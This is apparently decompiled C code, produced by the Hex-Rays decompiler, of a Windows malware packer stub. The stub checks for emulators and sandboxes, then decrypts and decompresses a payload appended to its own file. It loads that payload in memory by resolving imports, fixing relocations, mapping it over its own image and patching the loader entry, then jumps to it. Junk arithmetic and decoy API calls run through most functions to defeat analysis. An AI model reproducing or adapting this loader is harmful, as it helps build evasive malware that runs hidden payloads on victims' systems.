/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(int a1, int a2, int a3);
int __cdecl sub_401090(char *a1, int a2, unsigned int a3);
int __cdecl sub_401260(int *a1, char *a2);
HANDLE __cdecl sub_4012F0(LPCSTR lpFileName);
// int __userpurge start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HMODULE a4, int a5, int a6);
int __cdecl sub_401D90(int a1);
int __stdcall sub_402010(int a1);
int __cdecl sub_402640(int a1, int a2);
int __cdecl sub_402720(int a1);
BOOL __cdecl sub_402790(LPVOID lpMem);
LPVOID __cdecl sub_4027D0(SIZE_T dwBytes);
// int __stdcall GetTextFaceA(HDC hdc, int c, LPSTR lpName);
// COLORREF __stdcall GetBkColor(HDC hdc);
// HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// BOOL __stdcall GetBinaryTypeW(LPCWSTR lpApplicationName, LPDWORD lpBinaryType);
// BOOL __stdcall CloseHandle(HANDLE hObject);
// BOOL __stdcall ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// DWORD __stdcall SetFilePointer(HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod);
// DWORD __stdcall GetFileSize(HANDLE hFile, LPDWORD lpFileSizeHigh);
// DWORD __stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// BOOL __stdcall GetBinaryTypeA(LPCSTR lpApplicationName, LPDWORD lpBinaryType);
// HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName);
// ATOM __stdcall AddAtomW(LPCWSTR lpString);
// HANDLE __stdcall GetProcessHeap();
// LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// LPVOID __stdcall VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// BOOL __stdcall VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// BOOL __stdcall UnmapViewOfFile(LPCVOID lpBaseAddress);
// LPVOID __stdcall MapViewOfFileEx(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// HANDLE __stdcall CreateFileMappingA(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, LPCSTR lpName);
// FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
// HMODULE __stdcall LoadLibraryA(LPCSTR lpLibFileName);
// ATOM __stdcall AddAtomA(LPCSTR lpString);
// BOOL __stdcall HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// void __stdcall __noreturn ExitProcess(UINT uExitCode);
// BOOL __stdcall ClientToScreen(HWND hWnd, LPPOINT lpPoint);
// HACCEL __stdcall CreateAcceleratorTableA(LPACCEL paccel, int cAccel);
// HWND __stdcall GetShellWindow();
// BOOL __stdcall FlashWindow(HWND hWnd, BOOL bInvert);
// BOOL __stdcall CloseWindow(HWND hWnd);
// HWINEVENTHOOK __stdcall SetWinEventHook(DWORD eventMin, DWORD eventMax, HMODULE hmodWinEventProc, WINEVENTPROC pfnWinEventProc, DWORD idProcess, DWORD idThread, DWORD dwFlags);
// HDC __stdcall GetDC(HWND hWnd);
// HWND __stdcall GetDesktopWindow();
// BOOL __stdcall ValidateRgn(HWND hWnd, HRGN hRgn);
// BOOL __stdcall SetRectEmpty(LPRECT lprc);
// BOOL __stdcall CharToOemBuffW(LPCWSTR lpszSrc, LPSTR lpszDst, DWORD cchDstLength);
// int __stdcall wvsprintfA(LPSTR, LPCSTR, va_list arglist);
// BOOL __stdcall IsRectEmpty(const RECT *lprc);
// LONG __stdcall SetWindowLongW(HWND hWnd, int nIndex, LONG dwNewLong);
// SHORT __stdcall VkKeyScanW(WCHAR ch);
// HWND __stdcall CreateWindowExA(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// ATOM __stdcall RegisterClassA(const WNDCLASSA *lpWndClass);
// HCURSOR __stdcall LoadCursorA(HINSTANCE hInstance, LPCSTR lpCursorName);
// HICON __stdcall LoadIconA(HINSTANCE hInstance, LPCSTR lpIconName);
// LRESULT __stdcall DefWindowProcA(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// BOOL __stdcall WaitMessage();
// int __stdcall ReleaseDC(HWND hWnd, HDC hDC);
// HWND __stdcall CreateMDIWindowW(LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HINSTANCE hInstance, LPARAM lParam);
// BOOL __stdcall SetWindowPlacement(HWND hWnd, const WINDOWPLACEMENT *lpwndpl);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_401CB4; // weak
CHAR String[] = "ramfCEwGHd_PxP"; // idb
WCHAR aRlxbwdmdezenoa[] = L"RlxBwDmDEZEnOadFsAkKHIlRoRNkU_QE"; // idb
CHAR IconName[] = "ADRaixhwOLPaUpDV_yeJDPp"; // idb
char aZohzhxzwwixddb[31] = "zOHZHxzWwIXdDBnUYfIpbQbCuviJAj"; // weak
char aPkerteoxhtflvp[29] = "PKerTeoxhTFlVPznRtXxmDayQEQk"; // weak
CHAR WindowName[] = "cuEhGHUXKtKsYPJtcHPS_UMDSkjy"; // idb
CHAR ClassName[] = "gnNYTjLkxtHXTX"; // idb
CHAR ApplicationName[] = "zcutDRJpkSakoymAFoNeNFbzuYAiQ"; // idb
CHAR aRvzkdrcgzpzkwb[] = "RvZkDrcGZPZkWBTHQOtKMmFZEPhAqSdxccmH"; // idb
CHAR aPFpfiuvlq[] = "P_FpFiUVLQ"; // idb
WCHAR aRhhfgxjmwczpqa[] = L"\u6852\u4668\u7847\u6D4A\u6357\u705A\u6171\u5551\u4B42\u4570\u6346\u7845\u7079\u5842"; // idb
CHAR aXxfbccnpwkweeg[] = "xxFbCCNPwkweEGHP"; // idb
int dword_404164 = 0; // weak
int dword_404168 = 0; // weak
int dword_40416C = 0; // weak
int dword_404170 = 0; // weak
int dword_404174 = 0; // weak
LPCVOID lpAddress = NULL; // idb
int dword_40417C = 0; // weak
int dword_404180 = 0; // weak
int dword_404184 = 0; // weak
LPVOID lpMem = NULL; // idb
int dword_40418C = 0; // weak
int dword_404190 = 0; // weak
int dword_404194 = 0; // weak
int dword_404198 = 0; // weak
int dword_40419C = 0; // weak
int (__stdcall *dword_4041A0)(_DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4041A4 = 0; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, int a2, int a3)
{
  int result; // eax
  int v4; // [esp+4h] [ebp-14h]
  int v5; // [esp+4h] [ebp-14h]
  int i; // [esp+10h] [ebp-8h]

  v5 = 7727050 - v4;
  if ( !AddAtomA(String) )
    ExitProcess(0x5347887u);
  dword_40416C = v5;
  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(i + a1) = *(_BYTE *)(i + a2);
  }
  return result;
}
// 40100E: variable 'v4' is possibly undefined
// 40416C: using guessed type int dword_40416C;

//----- (00401090) --------------------------------------------------------
int __cdecl sub_401090(char *a1, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // eax
  int v5; // eax
  ATOM v6; // [esp+0h] [ebp-34h]
  int v7; // [esp+Ch] [ebp-28h] BYREF
  int v8; // [esp+10h] [ebp-24h]
  unsigned int i; // [esp+18h] [ebp-1Ch]
  int v10; // [esp+1Ch] [ebp-18h]
  char v11; // [esp+23h] [ebp-11h]
  unsigned int v12; // [esp+24h] [ebp-10h] BYREF
  int v13; // [esp+28h] [ebp-Ch]
  unsigned int v14; // [esp+2Ch] [ebp-8h]
  char v15; // [esp+33h] [ebp-1h]

  v6 = AddAtomW(aRlxbwdmdezenoa);
  dword_404184 = 1635326126;
  if ( !v6 )
  {
    dword_404184 = -147901924;
    ExitProcess(0x7744646u);
  }
  result = 4342956 << (25 - dword_404184);
  if ( a3 )
  {
    v11 = *a1;
    v14 = 1;
    v10 = 0;
    do
    {
      v15 = a1[v14++];
      if ( v15 == v11 )
      {
        if ( a1[v14] )
        {
          v13 = 1132964504 << dword_404194;
          v4 = sub_401260((int *)&v12, &a1[v14]);
          v14 += v4;
          v5 = sub_401260(&v7, &a1[v14]);
          v14 += v5;
          for ( i = 0; ; ++i )
          {
            result = i;
            if ( i >= v12 )
              break;
            *(_BYTE *)(v10 + a2) = *(_BYTE *)(a2 + v10 - v7);
            ++v10;
          }
        }
        else
        {
          *(_BYTE *)(v10 + a2) = v11;
          ++v10;
          v13 = v13 >> v8 << (-103 - dword_404190);
          result = ++v14;
        }
      }
      else
      {
        *(_BYTE *)(v10 + a2) = v15;
        result = ++v10;
        dword_4041A4 = 2 * dword_404194;
      }
    }
    while ( v14 < a3 );
  }
  return result;
}
// 404168: using guessed type int dword_404168;
// 404184: using guessed type int dword_404184;
// 404190: using guessed type int dword_404190;
// 404194: using guessed type int dword_404194;
// 4041A4: using guessed type int dword_4041A4;

//----- (00401260) --------------------------------------------------------
int __cdecl sub_401260(int *a1, char *a2)
{
  int v3; // [esp+0h] [ebp-20h]
  char v4; // [esp+8h] [ebp-18h]
  char v5; // [esp+Ch] [ebp-14h]
  int v6; // [esp+18h] [ebp-8h]
  int v7; // [esp+1Ch] [ebp-4h]

  v6 = 0;
  v3 = 0;
  do
  {
    v4 = *a2++;
    dword_404190 = (dword_404190 * dword_404170) >> dword_404190 << v7;
    v6 = v4 & 0x7F | (v6 << 7);
    v7 = dword_404168 << v5;
    ++v3;
  }
  while ( (v4 & 0x80) != 0 );
  *a1 = v6;
  return v3;
}
// 40129F: variable 'v7' is possibly undefined
// 4012BF: variable 'v5' is possibly undefined
// 404168: using guessed type int dword_404168;
// 404170: using guessed type int dword_404170;
// 404190: using guessed type int dword_404190;

//----- (004012F0) --------------------------------------------------------
HANDLE __cdecl sub_4012F0(LPCSTR lpFileName)
{
  HANDLE result; // eax
  HANDLE v2; // [esp+Ch] [ebp-14h]

  v2 = CreateFileA(lpFileName, 0x80000000, 1u, 0, 3u, 0x80u, 0);
  if ( v2 == (HANDLE)-1 )
    result = 0;
  else
    result = v2;
  return result;
}
// 404168: using guessed type int dword_404168;
// 404190: using guessed type int dword_404190;

//----- (00401360) --------------------------------------------------------
int __userpurge start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, HMODULE a4, int a5, int a6)
{
  HMODULE v6; // eax
  HMODULE v8; // eax
  HMODULE v9; // eax
  HWND v10; // eax
  HDC v11; // eax
  DWORD v12; // eax
  HMODULE v13; // eax
  BOOL v14; // [esp+10h] [ebp-1A4h]
  DWORD v15; // [esp+14h] [ebp-1A0h] BYREF
  SIZE_T dwBytes; // [esp+18h] [ebp-19Ch]
  unsigned int v17; // [esp+1Ch] [ebp-198h]
  HWND hWnd; // [esp+20h] [ebp-194h]
  struct tagPOINT Point; // [esp+24h] [ebp-190h] BYREF
  CHAR Name[256]; // [esp+2Ch] [ebp-188h] BYREF
  HWND v21; // [esp+12Ch] [ebp-88h]
  RECT rc; // [esp+130h] [ebp-84h] BYREF
  BOOL v23; // [esp+140h] [ebp-74h]
  DWORD BinaryType; // [esp+144h] [ebp-70h] BYREF
  WNDCLASSA WndClass; // [esp+148h] [ebp-6Ch] BYREF
  HWND v26; // [esp+170h] [ebp-44h]
  LPSTR lpFilename; // [esp+174h] [ebp-40h]
  HMODULE v28; // [esp+178h] [ebp-3Ch]
  DWORD nNumberOfBytesToRead; // [esp+17Ch] [ebp-38h]
  DWORD NumberOfBytesRead; // [esp+180h] [ebp-34h] BYREF
  LPVOID lpBuffer; // [esp+184h] [ebp-30h]
  HMODULE hModule; // [esp+188h] [ebp-2Ch]
  int v33; // [esp+18Ch] [ebp-28h]
  int v34; // [esp+190h] [ebp-24h]
  int v35; // [esp+194h] [ebp-20h]
  HANDLE hFile; // [esp+198h] [ebp-1Ch]
  int v37; // [esp+19Ch] [ebp-18h]
  int v38; // [esp+1A0h] [ebp-14h]
  int v39; // [esp+1A4h] [ebp-10h]
  char *i; // [esp+1A8h] [ebp-Ch]
  int v41; // [esp+1ACh] [ebp-8h]
  LONG lDistanceToMove; // [esp+1B0h] [ebp-4h]
  int savedregs; // [esp+1B4h] [ebp+0h] BYREF

  dword_404190 = v35 << ((2 * dword_404170) >> (42 - v41));
  dword_4041A4 = 500640 << v38 << (-72 * ((2 * dword_404170) >> (42 - v41)));
  WndClass.style = 0;
  v35 = v41 >> v38;
  WndClass.lpfnWndProc = DefWindowProcA;
  WndClass.cbClsExtra = 0;
  WndClass.cbWndExtra = 0;
  dword_404194 = 482055 - (v41 >> v38);
  WndClass.hInstance = GetModuleHandleA(0);
  dword_404190 = 1632201;
  v6 = GetModuleHandleA(0);
  WndClass.hIcon = LoadIconA(v6, IconName);
  dword_404190 = v41 + dword_404190 - 802978 - dword_404170;
  WndClass.hCursor = LoadCursorA(0, (LPCSTR)0x7F00);
  WndClass.hbrBackground = 0;
  dword_4041A4 = 277648 >> v38;
  WndClass.lpszMenuName = aZohzhxzwwixddb;
  v39 = v38 - dword_404170;
  WndClass.lpszClassName = aPkerteoxhtflvp;
  v41 = 1085937;
  if ( !RegisterClassA(&WndClass) )
    return 0;
  if ( a5 == 1 )
  {
    dword_40418C = 1;
    lpAddress = a4;
  }
  else
  {
    dword_40418C = 0;
  }
  v41 = dword_404194 << (dword_404170 + v38);
  v8 = GetModuleHandleA(0);
  v26 = CreateWindowExA(0, ClassName, WindowName, 1u, 164164, 7419718, 6262, 7817524, 0, 0, v8, 0);
  v41 = (v35 + dword_404168) << (dword_404194 - 42);
  v23 = GetBinaryTypeA(ApplicationName, &BinaryType);
  v39 = v41 - 630645;
  if ( v23 )
  {
    v39 = dword_404168 * v38;
    ExitProcess(0x184376u);
  }
  dword_404168 = (int)VkKeyScanW;
  if ( dword_40418C )
    hModule = a4;
  else
    hModule = GetModuleHandleA(0);
  dword_404190 = (int)SetWindowLongW;
  rc.bottom = 34884;
  v34 = dword_40416C + 3437500;
  rc.left = 25745;
  dword_40416C = dword_404184 - dword_404184 * (dword_40416C + 3437500);
  rc.right = 25368721;
  rc.top = 13879;
  dword_40416C = (294494 * dword_40416C) << dword_404184;
  IsRectEmpty(&rc);
  v34 = 3623657 * dword_40416C - 6064453;
  v28 = hModule;
  dword_404170 = (int)wvsprintfA;
  v33 = (int)hModule + *((_DWORD *)hModule + 15);
  v9 = GetModuleHandleA(0);
  v21 = CreateWindowExA(0, aPFpfiuvlq, aRvzkdrcgzpzkwb, 1u, 39254, 25432456, 599365, 416117, 0, 0, v9, 0);
  dword_404184 = 0;
  if ( v21 )
  {
    v34 += dword_404184 + 5204772;
    v34 = dword_404184 - v34;
  }
  dword_404190 = (int)CharToOemBuffW;
  v37 = v33 + *(unsigned __int16 *)(v33 + 20) + 24;
  v37 += 40 * (*(unsigned __int16 *)(v33 + 6) - 1);
  lDistanceToMove = *(_DWORD *)(v37 + 20)
                  + *(_DWORD *)(v33 + 60)
                  * ((unsigned int)(*(_DWORD *)(v37 + 16) + *(_DWORD *)(v33 + 60) - 1)
                   / *(_DWORD *)(v33 + 60));
  dword_404168 = (int)SetRectEmpty;
  lpFilename = (LPSTR)sub_4027D0(0x200u);
  if ( !lpFilename )
    return 0;
  dword_404170 = (int)ValidateRgn;
  GetModuleFileNameA(hModule, lpFilename, 0x200u);
  Name[0] = 0;
  v34 = 3902587 - dword_404184 - dword_40416C;
  v10 = GetDesktopWindow();
  v11 = GetDC(v10);
  GetTextFaceA(v11, 255, Name);
  if ( !Name[0] )
    v34 = dword_40416C >> 29 >> (dword_40416C >> 29) << 18;
  v34 <<= dword_40416C;
  dword_404170 <<= 14;
  hFile = sub_4012F0(lpFilename);
  if ( !hFile )
    return 0;
  dword_404190 = v35 + dword_4041A4 + 2 * v35;
  dword_404170 = (int)SetWinEventHook;
  v12 = GetFileSize(hFile, 0);
  nNumberOfBytesToRead = v12 - lDistanceToMove;
  dword_4041A4 = (int)CloseWindow;
  if ( v12 == lDistanceToMove )
    return 0;
  lpBuffer = sub_4027D0(nNumberOfBytesToRead + 16);
  if ( !lpBuffer )
    return 0;
  dword_404194 = dword_404170 + v38 + 969879;
  SetFilePointer(hFile, lDistanceToMove, 0, 0);
  if ( !ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0) )
    return 0;
  dword_404194 = (int)FlashWindow;
  dword_404170 = (v35 * v41) >> 16;
  CloseHandle(hFile);
  dword_404170 = (int)GetShellWindow;
  if ( NumberOfBytesRead != nNumberOfBytesToRead )
    return 0;
  dword_4041A4 = (int)CreateAcceleratorTableA;
  Point.x = 17971525;
  v41 = 0;
  Point.y = 313;
  v39 = 0;
  hWnd = GetDesktopWindow();
  v41 = 0;
  if ( !ClientToScreen(hWnd, &Point) )
    ExitProcess(0x9273u);
  dword_404170 = 0;
  dword_4041A4 = -1;
  v14 = GetBinaryTypeW(aRhhfgxjmwczpqa, &v15);
  dword_404170 = (dword_4041A4 * dword_404170) >> dword_404190 << dword_404194;
  if ( v14 )
  {
    v41 = (139495 - v41) >> dword_404170;
    ExitProcess(0x258u);
  }
  sub_401000((int)lpBuffer, (int)lpBuffer + nNumberOfBytesToRead - 64, 64);
  dword_4041A4 = (int)SetWindowPlacement;
  dword_40416C = 2087097;
  if ( !AddAtomA(aXxfbccnpwkweeg) )
  {
    dword_404184 = 2271423;
    ExitProcess(0x155237u);
  }
  v34 = dword_40416C;
  v17 = *(_DWORD *)lpBuffer;
  dword_4041A4 = (int)ReleaseDC;
  dword_40416C = 7915954;
  if ( GetBkColor((HDC)0x292D50) == -1 )
    v34 = dword_404184 << dword_404184 >> 15;
  dword_404184 = -179173040;
  dwBytes = *((_DWORD *)lpBuffer + 1);
  for ( i = 0; (unsigned int)i < v17; i += 8 )
  {
    dword_404170 = (int)CreateMDIWindowW;
    *(_DWORD *)((char *)lpBuffer + (_DWORD)i + 8) ^= 0xAE7Au;
    v35 = v38 + 951293 - dword_404168;
  }
  lpMem = sub_4027D0(dwBytes);
  if ( !lpMem )
    ExitProcess(0x245u);
  sub_401090((char *)lpBuffer + 8, (int)lpMem, v17);
  i = (char *)&loc_401CB4;
  dword_4041A4 = (v35 + 76416) >> 29;
  dword_40419C = (int)NtCurrentTeb();
  v41 = dword_404168 >> (dword_404168 + 43);
  dword_404174 = a2;
  dword_404164 = a3;
  dword_404180 = a1;
  v38 = 0;
  dword_40417C = (int)&savedregs;
  dword_404194 = dword_404170 >> (((v35 + 76416) >> 29) + 9);
  if ( dword_40418C )
  {
    sub_401D90(i - (_BYTE *)lpAddress);
  }
  else
  {
    v13 = GetModuleHandleA(0);
    sub_401D90(i - (char *)v13);
  }
  if ( !sub_402010((int)lpMem) )
  {
    sub_402790(lpMem);
    ExitProcess(0x196u);
  }
  dword_404168 = 332000 >> (dword_404194 - v35);
  dword_404190 = (32 * v41) >> v41;
  return dword_4041A0(a4, a5, a6);
}
// 4041A0: invalid function type has been ignored
// 404164: using guessed type int dword_404164;
// 404168: using guessed type int dword_404168;
// 40416C: using guessed type int dword_40416C;
// 404170: using guessed type int dword_404170;
// 404174: using guessed type int dword_404174;
// 40417C: using guessed type int dword_40417C;
// 404180: using guessed type int dword_404180;
// 404184: using guessed type int dword_404184;
// 40418C: using guessed type int dword_40418C;
// 404190: using guessed type int dword_404190;
// 404194: using guessed type int dword_404194;
// 40419C: using guessed type int dword_40419C;
// 4041A0: using guessed type int (__stdcall *dword_4041A0)(_DWORD, _DWORD, _DWORD);
// 4041A4: using guessed type int dword_4041A4;

//----- (00401D90) --------------------------------------------------------
int __cdecl sub_401D90(int a1)
{
  HMODULE v2; // [esp+4h] [ebp-38h]
  _DWORD *v3; // [esp+8h] [ebp-34h]
  int v4; // [esp+Ch] [ebp-30h]
  SIZE_T *v5; // [esp+10h] [ebp-2Ch]
  int v6; // [esp+14h] [ebp-28h]
  unsigned int v7; // [esp+18h] [ebp-24h]
  char v8; // [esp+20h] [ebp-1Ch]
  char v9; // [esp+24h] [ebp-18h]
  int v10; // [esp+28h] [ebp-14h]
  _DWORD *i; // [esp+2Ch] [ebp-10h]
  unsigned int j; // [esp+34h] [ebp-8h]
  int v13; // [esp+38h] [ebp-4h]

  dword_404168 = (117980 * dword_404194) << (-51 * v8);
  if ( dword_40418C )
    v2 = (HMODULE)lpAddress;
  else
    v2 = GetModuleHandleA(0);
  if ( !v2 )
    return 0;
  v5 = (SIZE_T *)((char *)v2 + *((_DWORD *)v2 + 15));
  dword_404198 = (int)VirtualAlloc(0, v5[20], 0x3000u, 0x40u);
  if ( dword_404198 )
  {
    v10 = 773864 >> (2 - dword_404168);
    sub_401000(dword_404198, (int)v2, v5[20]);
    v4 = dword_404198 - (_DWORD)v2;
    if ( v5[41] )
    {
      for ( i = (_DWORD *)((char *)v2 + v5[40]); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        dword_404194 = v10 >> 29 << (38 - dword_404190);
        v7 = (unsigned int)(i[1] - 8) >> 1;
        dword_4041A4 = v13 >> v9 >> (v13 * dword_4041A4);
        v3 = i + 2;
        dword_404190 = (dword_404194 + dword_4041A4 + v6) << 6;
        for ( j = 0; j < v7; ++j )
        {
          if ( (int)*((unsigned __int16 *)v3 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_404198 + (*((_WORD *)v3 + j) & 0xFFF)) += v4;
        }
      }
    }
    __asm { jmp     eax }
  }
  return 0;
}
// 401DA5: variable 'v8' is possibly undefined
// 401EA9: variable 'v13' is possibly undefined
// 401EA9: variable 'v9' is possibly undefined
// 401EC9: variable 'v6' is possibly undefined
// 404168: using guessed type int dword_404168;
// 40418C: using guessed type int dword_40418C;
// 404190: using guessed type int dword_404190;
// 404194: using guessed type int dword_404194;
// 404198: using guessed type int dword_404198;
// 4041A4: using guessed type int dword_4041A4;

//----- (00402010) --------------------------------------------------------
int __stdcall sub_402010(int a1)
{
  FARPROC v2; // eax
  const CHAR *j; // [esp+4h] [ebp-50h]
  _DWORD *v4; // [esp+Ch] [ebp-48h]
  char *v5; // [esp+10h] [ebp-44h]
  int v6; // [esp+14h] [ebp-40h]
  char *v7; // [esp+14h] [ebp-40h]
  int *v8; // [esp+18h] [ebp-3Ch]
  const CHAR *v9; // [esp+1Ch] [ebp-38h]
  unsigned int v10; // [esp+20h] [ebp-34h]
  int v11; // [esp+28h] [ebp-2Ch]
  _DWORD *v12; // [esp+2Ch] [ebp-28h]
  int *v13; // [esp+30h] [ebp-24h]
  int v14; // [esp+34h] [ebp-20h]
  int v15; // [esp+38h] [ebp-1Ch]
  const CHAR *k; // [esp+3Ch] [ebp-18h]
  HMODULE hModule; // [esp+40h] [ebp-14h]
  int v18; // [esp+44h] [ebp-10h]
  unsigned int i; // [esp+48h] [ebp-Ch]
  unsigned int l; // [esp+48h] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+4Ch] [ebp-8h]
  int v22; // [esp+50h] [ebp-4h]

  v6 = *(_DWORD *)(a1 + 60) + a1;
  v12 = (_DWORD *)(v6 + *(unsigned __int16 *)(v6 + 20) + 24);
  v9 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v6 + 80), 0x3000u, 0x40u);
  if ( !v9 )
    return 0;
  v14 = (413146 - dword_404190) >> v11;
  sub_401000((int)v9, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v6 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v6 + 6); ++i )
  {
    dword_4041A4 = v22 << (v14 + dword_4041A4);
    if ( v12[5] )
    {
      if ( v12[4] )
        sub_401000(
          (int)&v9[v12[3]],
          v12[5] + a1,
          *(_DWORD *)(v6 + 60) * ((unsigned int)(v12[4] + *(_DWORD *)(v6 + 60) - 1) / *(_DWORD *)(v6 + 60)));
    }
    dword_404170 = v15 << dword_404168;
    v12 += 10;
  }
  v7 = (char *)&v9[*((_DWORD *)v9 + 15)];
  for ( j = &v9[*((_DWORD *)v7 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    hModule = GetModuleHandleA(&v9[*((_DWORD *)j + 3)]);
    if ( !hModule )
    {
      if ( dword_40418C )
        return 0;
      hModule = LoadLibraryA(&v9[*((_DWORD *)j + 3)]);
      dword_404194 = v22 - 835601 * dword_404168;
      if ( !hModule )
        return 0;
    }
    v11 = dword_404194 + 597381;
    if ( *(_DWORD *)j )
    {
      v13 = (int *)&v9[*(_DWORD *)j];
      v8 = (int *)&v9[*((_DWORD *)j + 4)];
    }
    else
    {
      v13 = (int *)&v9[*((_DWORD *)j + 4)];
      v8 = (int *)&v9[*(_DWORD *)j];
    }
    v18 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v18 = 1;
    while ( *v13 )
    {
      dword_404194 = 169860 * dword_404168 - dword_404170;
      if ( *v13 >= 0 )
        v2 = GetProcAddress(hModule, &v9[*v13 + 2]);
      else
        v2 = GetProcAddress(hModule, (LPCSTR)(*v13 & 0x7FFFFFFF));
      *v13 = (int)v2;
      if ( !*v13 )
        return 0;
      if ( v18 )
        *v8 = *v13;
      ++v13;
      ++v8;
    }
  }
  if ( dword_40418C )
  {
    v5 = (char *)lpAddress - *((_DWORD *)v7 + 13);
    if ( *((_DWORD *)v7 + 41) )
    {
      for ( k = &v9[*((_DWORD *)v7 + 40)]; *((_DWORD *)k + 1); k += *((_DWORD *)k + 1) )
      {
        v10 = (unsigned int)(*((_DWORD *)k + 1) - 8) >> 1;
        v4 = k + 8;
        for ( l = 0; l < v10; ++l )
        {
          v11 = 90301 << dword_404190;
          if ( (int)*((unsigned __int16 *)v4 + l) >> 12 == 3 )
            *(_DWORD *)&v9[*(_DWORD *)k + (*((_WORD *)v4 + l) & 0xFFF)] += v5;
        }
      }
    }
  }
  hFileMappingObject = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, *((_DWORD *)v7 + 20), 0);
  if ( !hFileMappingObject )
    return 0;
  dword_404168 = -1610967494 * v22;
  if ( dword_40418C )
    dword_404198 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress);
  else
    dword_404198 = (int)MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v7 + 13));
  if ( dword_404198 )
    goto LABEL_66;
  dword_404190 = v11 - 471588 * v15;
  if ( dword_40418C )
  {
    if ( !UnmapViewOfFile(lpAddress) && !VirtualFree((LPVOID)lpAddress, 0, 0x8000u) )
      return 0;
  }
  else if ( !UnmapViewOfFile(*((LPCVOID *)v7 + 13)) && !VirtualFree(*((LPVOID *)v7 + 13), 0, 0x8000u) )
  {
    return 0;
  }
  dword_404198 = (int)(dword_40418C ? MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, (LPVOID)lpAddress) : MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v7 + 13)));
  if ( !dword_404198 )
  {
    dword_404198 = (int)(dword_40418C ? VirtualAlloc((LPVOID)lpAddress, *((_DWORD *)v7 + 20), 0x3000u, 0x40u) : VirtualAlloc(*((LPVOID *)v7 + 13), *((_DWORD *)v7 + 20), 0x3000u, 0x40u));
    if ( !dword_404198 )
      return 0;
  }
LABEL_66:
  dword_404168 = 66040 << (-105 * v22);
  sub_401000(dword_404198, (int)v9, *((_DWORD *)v7 + 20));
  if ( dword_40418C )
    sub_402640((int)lpAddress, *((_DWORD *)v7 + 10) + dword_404198);
  else
    sub_402720(dword_404198);
  dword_4041A0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))(*((_DWORD *)v7 + 10) + dword_404198);
  *((_DWORD *)v7 + 10) = dword_4041A0;
  return 1;
}
// 402070: variable 'v11' is possibly undefined
// 4020CB: variable 'v22' is possibly undefined
// 40212A: variable 'v15' is possibly undefined
// 404168: using guessed type int dword_404168;
// 404170: using guessed type int dword_404170;
// 40418C: using guessed type int dword_40418C;
// 404190: using guessed type int dword_404190;
// 404194: using guessed type int dword_404194;
// 404198: using guessed type int dword_404198;
// 4041A0: using guessed type int (__stdcall *dword_4041A0)(_DWORD, _DWORD, _DWORD);
// 4041A4: using guessed type int dword_4041A4;

//----- (00402640) --------------------------------------------------------
int __cdecl sub_402640(int a1, int a2)
{
  int v3; // [esp+4h] [ebp-24h]
  _DWORD *v4; // [esp+10h] [ebp-18h]
  int v5; // [esp+14h] [ebp-14h]
  _DWORD *v6; // [esp+20h] [ebp-8h]

  v4 = *(_DWORD **)(*(_DWORD *)(*(_DWORD *)(dword_40419C + 48) + 12) + 12);
  v6 = v4;
  do
  {
    if ( !v4 )
      return 0;
    dword_404194 = 904205 - v3 - v5;
    if ( v4[6] == a1 )
    {
      v4[7] = a2;
      return 1;
    }
    v5 = 0;
    v4 = (_DWORD *)*v4;
  }
  while ( v4 != v6 );
  return 0;
}
// 4026C1: variable 'v3' is possibly undefined
